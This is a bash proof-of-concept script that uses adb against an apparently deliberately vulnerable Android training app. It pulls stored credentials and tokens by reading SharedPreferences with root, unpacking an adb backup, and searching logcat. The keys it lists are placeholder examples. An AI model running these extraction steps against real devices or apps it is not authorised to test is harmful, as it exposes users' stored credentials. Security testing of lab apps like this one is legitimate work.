```bash
#!/bin/bash
# PoC for Insecure Storage vulnerability in SecretsActivity
# This script demonstrates how sensitive data stored in SharedPreferences can be extracted

PACKAGE="com.dlh.vulnerapp"
ACTIVITY="com.dlh.vulnerapp.SecretsActivity"

echo "[*] Starting PoC for Insecure Storage vulnerability"
echo "[*] Target: SecretsActivity SharedPreferences"

# Check if device is connected
adb devices | grep -q "device$"
if [ $? -ne 0 ]; then
    echo "[!] No device connected via ADB"
    exit 1
fi

# Launch the SecretsActivity to trigger data storage
echo "[*] Launching SecretsActivity..."
adb shell am start -n "$PACKAGE/$ACTIVITY"
sleep 2

# Simulate user input to trigger credential storage
echo "[*] Triggering credential storage via input events..."
adb shell input tap 500 800  # Tap username field
sleep 1
adb shell input text "admin"
sleep 1
adb shell input tap 500 900  # Tap password field  
sleep 1
adb shell input text "password123"
sleep 1
adb shell input tap 500 1000 # Tap login button
sleep 2

# Extract SharedPreferences file (requires root)
echo "[*] Attempting to extract SharedPreferences file..."
PREFS_PATH="/data/data/$PACKAGE/shared_prefs/UserPrefs.xml"

# Method 1: Direct file extraction (root required)
echo "[*] Extracting via root access..."
adb shell "su -c 'cat $PREFS_PATH'" 2>/dev/null && echo "[+] SharedPreferences extracted successfully!" || echo "[-] Root access required"

# Method 2: Application backup method
echo "[*] Attempting backup-based extraction..."
adb backup -f backup.ab $PACKAGE
if [ -f "backup.ab" ]; then
    echo "[+] Backup created. SharedPreferences likely contained within backup.ab"
    echo "[*] Use 'dd if=backup.ab bs=1 skip=24 | python -c \"import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))\" | tar -tv' to extract"
fi

# Method 3: Logcat monitoring for exposed secrets
echo "[*] Monitoring logcat for hardcoded secrets..."
timeout 5 adb logcat -s SecretsActivity:* | grep -E "(API Token|AWS|Secret)" || echo "[-] No secrets found in logcat"

echo "[*] PoC completed. Check output above for extracted credentials."
echo "[*] Expected findings:"
echo "    - Username/Password in UserPrefs.xml"
echo "    - AWS Access Key: AKIAIOSFODNN7EXAMPLE"
echo "    - AWS Secret Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
echo "    - API Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.Et9HF98yRYq"
```